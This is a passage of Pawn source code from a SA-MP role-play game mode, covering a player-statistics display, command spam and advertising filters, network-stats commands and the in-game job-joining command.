					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
					else if(skilllevel >= 401) { jlevel = 5; }
			}
			case 2:
			{
					new skilllevel = PlayerInfo[targetid][pLawSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
					else if(skilllevel >= 401) { jlevel = 5; }
			}
			case 3:
			{
					new skilllevel = PlayerInfo[targetid][pSexSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
					else if(skilllevel >= 401) { jlevel = 5; }
			}
			case 4:
			{
					new skilllevel = PlayerInfo[targetid][pDrugsSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
					else if(skilllevel >= 401) { jlevel = 5; }
			}
			case 5:
			{
					new skilllevel = PlayerInfo[targetid][pCarSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
					else if(skilllevel >= 401) { jlevel = 5; }
			}
	  		case 7:
			{
					new skilllevel = PlayerInfo[targetid][pMechSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
					else if(skilllevel >= 401) { jlevel = 5; }
			}
			case 9:
			{
					new skilllevel = PlayerInfo[targetid][pArmsSkill];
					if(skilllevel >= 0 && skilllevel < 50) { jlevel = 1; }
					else if(skilllevel >= 50 && skilllevel < 100) { jlevel = 2; }
					else if(skilllevel >= 100 && skilllevel < 200) { jlevel = 3; }
					else if(skilllevel >= 200 && skilllevel < 400) { jlevel = 4; }
					else if(skilllevel >= 400) { jlevel = 5; }
			}
			case 12:
			{
					new skilllevel = PlayerInfo[targetid][pBoxSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
					else if(skilllevel >= 401) { jlevel = 5; }
			}
			case 14:
			{
					new skilllevel = PlayerInfo[targetid][pSmugSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
					else if(skilllevel >= 401) { jlevel = 5; }
			}
			case 20:
			{
					new skilllevel = PlayerInfo[targetid][pTruckSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
					else if(skilllevel >= 401) { jlevel = 5; }
			}
			default: jlevel = 0;
		}
		new jlevel2;
		switch(PlayerInfo[targetid][pJob2])
		{
			case 1:
			{
					new skilllevel = PlayerInfo[targetid][pDetSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel2 = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel2 = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel2 = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel2 = 4; }
					else if(skilllevel >= 401) { jlevel2 = 5; }
			}
			case 2:
			{
					new skilllevel = PlayerInfo[targetid][pLawSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel2 = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel2 = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel2 = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel2 = 4; }
					else if(skilllevel >= 401) { jlevel2 = 5; }
			}
			case 3:
			{
					new skilllevel = PlayerInfo[targetid][pSexSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel2 = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel2 = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel2 = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel2 = 4; }
					else if(skilllevel >= 401) { jlevel2 = 5; }
			}
			case 4:
			{
					new skilllevel = PlayerInfo[targetid][pDrugsSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel2 = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel2 = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel2 = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel2 = 4; }
					else if(skilllevel >= 401) { jlevel2 = 5; }
			}
			case 5:
			{
					new skilllevel = PlayerInfo[targetid][pCarSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel2 = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel2 = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel2 = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel2 = 4; }
					else if(skilllevel >= 401) { jlevel2 = 5; }
			}
	  		case 7:
			{
					new skilllevel = PlayerInfo[targetid][pMechSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel2 = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel2 = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel2 = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel2 = 4; }
					else if(skilllevel >= 401) { jlevel2 = 5; }
			}
			case 9:
			{
					new skilllevel = PlayerInfo[targetid][pArmsSkill];
					if(skilllevel >= 0 && skilllevel < 50) { jlevel2 = 1; }
					else if(skilllevel >= 50 && skilllevel < 100) { jlevel2 = 2; }
					else if(skilllevel >= 100 && skilllevel < 200) { jlevel2 = 3; }
					else if(skilllevel >= 200 && skilllevel < 400) { jlevel2 = 4; }
					else if(skilllevel >= 400) { jlevel2 = 5; }
			}
			case 12:
			{
					new skilllevel = PlayerInfo[targetid][pBoxSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel2 = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel2 = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel2 = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel2 = 4; }
					else if(skilllevel >= 401) { jlevel2 = 5; }
			}
			case 14:
			{
					new skilllevel = PlayerInfo[targetid][pSmugSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel2 = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel2 = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel2 = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel2 = 4; }
					else if(skilllevel >= 401) { jlevel2 = 5; }
			}
			case 20:
			{
					new skilllevel = PlayerInfo[targetid][pTruckSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel2 = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel2 = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel2 = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel2 = 4; }
					else if(skilllevel >= 401) { jlevel2 = 5; }
			}
			default: jlevel2 = 0;
		}

		new upgrade = PlayerInfo[targetid][gPupgrade];
		new Float:sarmor = PlayerInfo[targetid][pSarmor];

		new cash =  GetPlayerCash(targetid);
		new bank = PlayerInfo[targetid][pBank];
		new totalwealth = cash + bank;

		new insur[20];
		switch(PlayerInfo[targetid][pInsurance])
		{
			case 1: insur = "All Saints";
			case 2: insur = "County General";
			default: insur = "None";
		}

		new crimes = PlayerInfo[targetid][pCrimes];
		new arrests = PlayerInfo[targetid][pArrested];
		new wanted = PlayerInfo[targetid][pWantedLevel];
		new Float:health, Float:armor;
		GetPlayerHealth(targetid,health);
		GetPlayerArmour(targetid,armor);

		new pot = PlayerInfo[targetid][pPot];
		new crack = PlayerInfo[targetid][pCrack];
		new packages = GetPVarInt(targetid, "Packages");
		new crates = PlayerInfo[targetid][pCrates];

		new mats = PlayerInfo[targetid][pMats];
		new rope = PlayerInfo[targetid][pRope];
		new cigars = PlayerInfo[targetid][pCigar];
		new sprunk = PlayerInfo[targetid][pSprunk];
		new spray = PlayerInfo[targetid][pSpraycan];
		new bigfish = PlayerInfo[targetid][pBiggestFish];

		// Eight line (admin only)
		new house = PlayerInfo[targetid][pHouse];
		new rent = PlayerInfo[targetid][pRenting];
		new interior = PlayerInfo[targetid][pInt];
		new vw = PlayerInfo[targetid][pVW];
		new realvw = GetPlayerVirtualWorld(targetid);
		new jtime = PlayerInfo[targetid][pJailTime];

		// Added
		new married[20];
		strmid(married, PlayerInfo[targetid][pMarriedTo], 0, strlen(PlayerInfo[targetid][pMarriedTo]), 255);
		new reftokens = PlayerInfo[targetid][pRefTokens];
		new sext[16];
		if(PlayerInfo[targetid][pSex] == 1) { sext = "Male"; } else { sext = "Female"; }
		new age = PlayerInfo[targetid][pAge];

  		new drank[20];
		if(PlayerInfo[targetid][pVip] == 1)
		{ drank = "Bronze"; }
		if(PlayerInfo[targetid][pVip] == 2)
		{ drank = "Silver"; }
		if(PlayerInfo[targetid][pVip] == 3)
		{ drank = "Gold"; }
		else if(PlayerInfo[targetid][pVip] == 4)
		{ drank = "Platinum"; }
		else { drank = "None"; }

		new nmutes = PlayerInfo[targetid][pNMuteTotal];
        new admutes = PlayerInfo[targetid][pADMuteTotal];
        new rmutes = PlayerInfo[targetid][pRMutedTotal];

	    SendClientMessage(playerid, COLOR_GREEN,"___________________________________________________________________________________________________");
	    new coordsstring[128];
		if(pnumber == 0) format(coordsstring, sizeof(coordsstring),"%s - (Level: %d) - (Playing hours: %d) - (Gender: %s) - (Age: %d) - (Phone number: None) - (Warnings: %d)", GetPlayerNameEx(targetid), level, phours, sext, age, warns);
		else format(coordsstring, sizeof(coordsstring),"%s - (Level: %d) - (Playing hours: %d) - (Gender: %s) - (Age: %d) - (Phone number: %d) - (Warnings: %d)", GetPlayerNameEx(targetid), level, phours, sext, age, pnumber, warns);
		SendClientMessage(playerid, COLOR_WHITE, coordsstring);
		format(coordsstring, sizeof(coordsstring),"(%s: %s) - (Rank: %s [%d]) - (Division: %s) - (Job: %s [lvl: %d]) - (Job 2: %s [lvl: %d])", facgang, employer, rank, PlayerInfo[targetid][pRank], division, jtext, jlevel, jtext2, jlevel2);
		SendClientMessage(playerid, COLOR_GREY, coordsstring);
   		format(coordsstring, sizeof(coordsstring),"(Total wealth: $%d) - (Cash: $%d) - (Bank balance: $%d) - (Insurance: %s) - (Married to: %s)", totalwealth, cash, bank, insur, married);
   		SendClientMessage(playerid, COLOR_WHITE, coordsstring);
		if(PlayerInfo[playerid][pAdmin] < 4 && playerid != targetid) {
			format(coordsstring, sizeof(coordsstring),"(Respect points: %d/%d [$%d]) - (Upgrade Points: %d) - (Spawn armor: %.1f) - (Health: %.1f) - (Armor: %.1f)", respect, expamount, costlevel, upgrade, sarmor, health, armor);
			SendClientMessage(playerid, COLOR_GREY, coordsstring);
		} else {
			format(coordsstring, sizeof(coordsstring),"(Respect points: %d/%d [$%d]) - (Upgrade Points: %d) - (Spawn armor: %.1f) - (Health: %.1f) - (Armor: %.1f) - (Radio: %d kHz)", respect, expamount, costlevel, upgrade, sarmor, health, armor, PlayerInfo[targetid][pRadioFreq]);
			SendClientMessage(playerid, COLOR_GREY, coordsstring);
		}
   		format(coordsstring, sizeof(coordsstring),"(Crimes: %d) - (Arrests: %d) - (Wanted Level: %d) - (Materials: %d) - (Pot: %d) - (Crack: %d) - (Packages: %d) - (Crates: %d)", crimes, arrests, wanted, mats, pot, crack, packages, crates);
   		SendClientMessage(playerid, COLOR_WHITE, coordsstring);
   		format(coordsstring, sizeof(coordsstring),"(Rope: %d) - (Cigars: %d) - (Sprunk: %d) - (Spray: %d) - (Seeds: %d) -  (Biggest fish: %d) - (Referral Tokens: %d) - (Donator: %s)", rope, cigars, sprunk, spray, PlayerInfo[targetid][pWSeeds], bigfish, reftokens, drank);
        SendClientMessage(playerid, COLOR_GREY, coordsstring);

		if(PlayerInfo[playerid][pAdmin] >= 1) {
		    format(coordsstring, sizeof(coordsstring), "(House: %d) - (Renting: %d) - (Int: %d) - (VW: %d) - (Real VW: %d) - (Jail: %d secs) - (Mutes: [N: %d] [AD: %d] [R: %d])", house, rent, interior, vw, realvw, jtime, nmutes, admutes, rmutes);
		    SendClientMessage(playerid, COLOR_WHITE,coordsstring);

	    	new tabbed[4];
		    if(playerTabbedTime[targetid] > 0) tabbed = "Yes";
		    else tabbed = "No";

		    new afk[4];
		    if(playerAFK[targetid] != 0 && playerAFKTime[targetid] > 0) afk = "Yes";
		    else afk = "No";

		    format(coordsstring, sizeof(coordsstring), "(Alt-tabbed: %s [%d secs]) - (AFK: %s [%d secs])", tabbed, playerTabbedTime[targetid], afk, playerAFKTime[targetid]);
		    SendClientMessage(playerid, COLOR_WHITE,coordsstring);
		}
		SendClientMessage(playerid, COLOR_GREEN,"___________________________________________________________________________________________________");
	}
}

public OnPlayerCommandPerformed(playerid, cmdtext[], success)
{
	if(!success) SendClientMessage(playerid, COLOR_WHITE, "That command does not exist. You can use /help to see a list of commands.");
	return 1;
}

public OnPlayerCommandReceived(playerid, cmdtext[])
{
	playerLastTyped[playerid] = 0;
	printf("[cmd] [%s]: %s", GetPlayerNameEx(playerid), cmdtext);

	if(gPlayerLogged[playerid] != 1)
	{
		SendClientMessage(playerid, COLOR_RED, "You're not logged in.");
		return 0;
	}

	if(GetPVarInt(playerid, "LoadingObjects") == 1) {
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 0;
	}

	if(PlayerInfo[playerid][pTut] == 0)
		return 1;

	if(CommandSpamUnmute[playerid] != 0) {
		if(PlayerInfo[playerid][pAdmin] < 6) {
			SendClientMessage(playerid, COLOR_WHITE, "You're muted from submitting commands right now.");
			return 0;
		}
	}

	if(PlayerInfo[playerid][pAdmin] < 6) {
		CommandSpamTimes[playerid]++;

		if(CommandSpamTimes[playerid] == 5)
		{
			CommandSpamTimes[playerid] = 0;
			CommandSpamUnmute[playerid] = 10;
			SendClientMessage(playerid, COLOR_YELLOW, "You have been muted automatically for spamming. Please wait 10 seconds and try again.");
			SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_FLOODPROTECTION);
			return 0;
		}
	}

	if(strfind(cmdtext, "|", true) != -1)
	{
	    SendClientMessage(playerid, COLOR_RED, "You can't use the '|' character in commands.");
		return 0;
	}

	if(PlayerInfo[playerid][pAdmin] < 4)
	{
		if(strfind(cmdtext, ":", true) != -1)
		{

			new
				i_numcount,
				i_period,
				i_pos;

			while(cmdtext[i_pos]) {
				if('0' <= cmdtext[i_pos] <= '9') i_numcount++;
				else if(cmdtext[i_pos] == '.') i_period++;
				i_pos++;
			}
			if(i_numcount >= 8 && i_period >= 3) {
				new string[128];
				format(string,sizeof(string),"Warning: %s may be server advertising: '%s'.", GetPlayerNameEx(playerid),cmdtext);
				ABroadCast(COLOR_RED, string, 2);
				Log("logs/hack.log", string);
				return 0;
			}
		}
	}
	return 1;
}

CMD:stats(playerid, params[])
{
	if(gPlayerLogged[playerid] != 0)
	{
		ShowStats(playerid,playerid);
	}
	return 1;
}

CMD:netstats(playerid, params[]) {
	if(gPlayerLogged[playerid] != 0) {
		new strStats[401], szTitle[64];
		GetPlayerNetworkStats(playerid, strStats, sizeof(strStats));
		format(szTitle, sizeof(szTitle), "Network Stats (ID: %d) - %s", playerid, GetPlayerNameEx(playerid));
		ShowPlayerDialogEx(playerid, 0, DIALOG_STYLE_MSGBOX, szTitle, strStats, "Close", "");
	}
	return 1;
}

CMD:anetstats(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 2) {
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
		return 1;
	}
 	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
  	{
   		SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
		return 1;
	}

	new giveplayerid, strStats[401], szTitle[64];
	if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /anetstats [playerid/partofname]");

	if(gPlayerLogged[giveplayerid] != 0) {
		GetPlayerNetworkStats(giveplayerid, strStats, sizeof(strStats));
		format(szTitle, sizeof(szTitle), "Network Stats (ID: %d) - %s", giveplayerid, GetPlayerNameEx(giveplayerid));
		ShowPlayerDialogEx(playerid, 0, DIALOG_STYLE_MSGBOX, szTitle, strStats, "Close", "");
	}
	return 1;
}

CMD:join(playerid, params[])
{
    if(PlayerInfo[playerid][pJob] == 0)
	{
    	if(PlayerInfo[playerid][pJob] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0, 256.971954, 69.655586, 1003.640625))
		{
 			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* If you're sure to become a Detective, type /accept job.");
   			GettingJob[playerid] = 1;
     		return 1;
 		}
   		else if(PlayerInfo[playerid][pJob] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,1380.8955,-1088.6808,27.3844))
   		{
     		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* If you're sure to become a Lawyer, type /accept job.");
       		GettingJob[playerid] = 2;
         	return 1;
     	}
		else if(PlayerInfo[playerid][pJob] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,1215.1304,-11.8431,1000.9219))
	 	{
   			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* If you're sure to become a Whore, type /accept job.");
      		GettingJob[playerid] = 3;
        	return 1;
   		}
   		else if(PlayerInfo[playerid][pJob] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,2166.3772,-1675.3829,15.0859))
   		{
     		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* If you're sure to become a Drugs Dealer, type /accept job.");
       		GettingJob[playerid] = 4;
         	return 1;
     	}
      	else if(PlayerInfo[playerid][pJob] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,216.44,18.47,2.14))
		  {
       		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* If you're sure to become a Car Mechanic, type /accept job.");
         	GettingJob[playerid] = 7;
          	return 1;
      	}
      	else if(PlayerInfo[playerid][pJob] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,2226.1716,-1718.1792,13.5165))
	  	{ // Ganton Gym
    		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* If you're sure to become a Bodyguard, type /accept job.");
      		GettingJob[playerid] = 8;
        	return 1;
      	}
       	else if(PlayerInfo[playerid][pJob] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,1099.73,-1504.67,15.800))
	   	{ // All Saints Mall
    		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* If you're sure to become a Bodyguard, type /accept job.");
      		GettingJob[playerid] = 8;
        	return 1;
       	}
        else if(PlayerInfo[playerid][pJob] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,1366.4325,-1275.2096,13.5469))
		{ // Big Ammunation
  			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* If you're sure to become a Arms Dealer, type /accept job.");
     		GettingJob[playerid] = 9;
       		return 1;
        }
        else if(PlayerInfo[playerid][pJob] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,766.0804,14.5133,1000.7004))
		{
  			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* If you're sure to become a Boxer, type /accept job.");
     		GettingJob[playerid] = 12;
       		return 1;
        }
        else if(PlayerInfo[playerid][pJob] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,758.98, -60.32, 1000.78))
		{
  			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* If you're sure to become a Boxer, type /accept job.");
     		GettingJob[playerid] = 12;
       		return 1;
  		}
     	else if(PlayerInfo[playerid][pJob] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,2354.2808,-1169.2959,28.0066))
	 	{
   			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* If you're sure to become a Drug Smuggler, type /accept job.");
      		GettingJob[playerid] = 14;
        	return 1;
   		}
     	else if(PlayerInfo[playerid][pJob] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,1741.5199,-1863.4615,13.5750))
	 	{
   			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* If you're sure to become a Taxi Driver, type /accept job.");
      		GettingJob[playerid] = 17;
        	return 1;
      	}
       	else if(PlayerInfo[playerid][pJob] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,2195.8335,-1973.0638,13.5589))
   		{
     		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* If you're sure to become a Craftsman, type /accept job.");
      		GettingJob[playerid] = 18;
        	return 1;
       	}
       	else if(PlayerInfo[playerid][pJob] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,502.6696,-11.6603,1000.6797))
	   	{
   			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* If you're sure to become a Bartender, type /accept job.");
      		GettingJob[playerid] = 19;
        	return 1;
       	}
        else if(PlayerInfo[playerid][pJob] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,-1549.33, 112.50, 3.12))
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* If you're sure to become a Trucker, type /accept job.");
			GettingJob[playerid] = 20;
			return 1;
		}
		else if(PlayerInfo[playerid][pJob] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,-1720.07, 1356.23, 6.75))
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* If you're sure to become a Pizza Boy, type /accept job.");
        	GettingJob[playerid] = 21;
        	return 1;
    	}
    	else
		{
  			SendClientMessage(playerid, COLOR_GREY, "You're not even near a place to get a Job!");
     	}
	}
	else if(PlayerInfo[playerid][pJob] != 0 && PlayerInfo[playerid][pVip] < 2 && PlayerInfo[playerid][pLevel] < 25)
 	{
  		SendClientMessage(playerid, COLOR_GREY, "You already have a Job, use /quitjob first!");
		SendClientMessage(playerid, COLOR_GREY, "Only VIP and level 25+ can get two jobs!");
  	}
	else if(PlayerInfo[playerid][pJob2] == 0 && (PlayerInfo[playerid][pVip] >= 2 || PlayerInfo[playerid][pLevel] >= 25))
	{
    	if(PlayerInfo[playerid][pJob2] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0, 256.971954, 69.655586, 1003.640625))
		{
 			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* If you're sure to become a Detective, type /accept job.");
   			GettingJob2[playerid] = 1;
     		return 1;
 		}
   		else if(PlayerInfo[playerid][pJob2] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,1380.8955,-1088.6808,27.3844))
   		{
     		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* If you're sure to become a Lawyer, type /accept job.");
       		GettingJob2[playerid] = 2;
         	return 1;
     	}
		else if(PlayerInfo[playerid][pJob2] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,1215.1304,-11.8431,1000.9219))
	 	{
   			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* If you're sure to become a Whore, type /accept job.");
      		GettingJob2[playerid] = 3;
        	return 1;
   		}
   		else if(PlayerInfo[playerid][pJob2] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,2166.3772,-1675.3829,15.0859))
   		{
     		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* If you're sure to become a Drugs Dealer, type /accept job.");
       		GettingJob2[playerid] = 4;
         	return 1;
     	}
      	else if(PlayerInfo[playerid][pJob2] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,216.44, 18.47, 2.14))
		  {
       		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* If you're sure to become a Car Mechanic, type /accept job.");
         	GettingJob2[playerid] = 7;
          	return 1;
      	}
      	else if(PlayerInfo[playerid][pJob2] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,2226.1716,-1718.1792,13.5165))
	  	{ // Ganton Gym
    		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* If you're sure to become a Bodyguard, type /accept job.");
      		GettingJob2[playerid] = 8;
        	return 1;
      	}
       	else if(PlayerInfo[playerid][pJob2] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,1099.73,-1504.67,15.800))
	   	{ // All Saints Mall
    		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* If you're sure to become a Bodyguard, type /accept job.");
      		GettingJob2[playerid] = 8;
        	return 1;
       	}
        else if(PlayerInfo[playerid][pJob2] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,1366.4325,-1275.2096,13.5469))
		{ // Big Ammunation
  			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* If you're sure to become a Arms Dealer, type /accept job.");
     		GettingJob2[playerid] = 9;
       		return 1;
        }
        else if(PlayerInfo[playerid][pJob2] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,766.0804,14.5133,1000.7004))
		{
  			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* If you're sure to become a Boxer, type /accept job.");
     		GettingJob2[playerid] = 12;
       		return 1;
        }
        else if(PlayerInfo[playerid][pJob2] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,758.98, -60.32, 1000.78))
		{
  			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* If you're sure to become a Boxer, type /accept job.");
     		GettingJob2[playerid] = 12;
       		return 1;
  		}
     	else if(PlayerInfo[playerid][pJob2] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,2354.2808,-1169.2959,28.0066))
	 	{
   			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* If you're sure to become a Drug Smuggler, type /accept job.");
      		GettingJob2[playerid] = 14;
        	return 1;
   		}
     	else if(PlayerInfo[playerid][pJob2] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,1741.5199,-1863.4615,13.5750))
	 	{
   			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* If you're sure to become a Taxi Driver, type /accept job.");
      		GettingJob2[playerid] = 17;
        	return 1;
      	}
       	else if(PlayerInfo[playerid][pJob2] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,2195.8335,-1973.0638,13.5589))
   		{
     		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* If you're sure to become a Craftsman, type /accept job.");
      		GettingJob2[playerid] = 18;
        	return 1;
       	}
       	else if(PlayerInfo[playerid][pJob2] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,502.6696,-11.6603,1000.6797))
	   	{
   			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* If you're sure to become a Bartender, type /accept job.");
      		GettingJob2[playerid] = 19;
        	return 1;
       	}
        else if(PlayerInfo[playerid][pJob2] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,-1549.33, 112.50, 3.12))
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* If you're sure to become a Trucker, type /accept job.");
			GettingJob2[playerid] = 20;
			return 1;
		}
		else if(PlayerInfo[playerid][pJob2] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,-1720.07, 1356.23, 6.75))
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* If you're sure to become a Pizza Boy, type /accept job.");
        	GettingJob2[playerid] = 21;
        	return 1;
    	}
    	else
		{
  			SendClientMessage(playerid, COLOR_GREY, "You're not even near a place to get a Job!");
     	}
	}
	else if(PlayerInfo[playerid][pJob] != 0 && PlayerInfo[playerid][pJob2] != 0)
 	{
  		SendClientMessage(playerid, COLOR_GREY, "You already have 2 Jobs, use /quitjob first!");
  	}
   	return 1;
}

CMD:quitjob(playerid, params[])
{
	if(PlayerInfo[playerid][pVip] >= 2)
	{
		new jobid;
